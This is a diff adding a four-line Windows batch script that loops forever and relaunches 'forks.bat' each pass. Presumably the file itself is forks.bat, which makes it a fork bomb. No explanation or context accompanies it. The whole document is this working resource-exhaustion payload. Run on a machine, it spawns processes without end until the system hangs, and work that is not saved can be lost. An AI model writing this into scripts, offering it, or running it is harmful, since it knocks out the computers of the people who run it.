@@ -1,0 +1,4 @@
+@ECHO OFF
+:START
+START forks.bat
+GOTO START
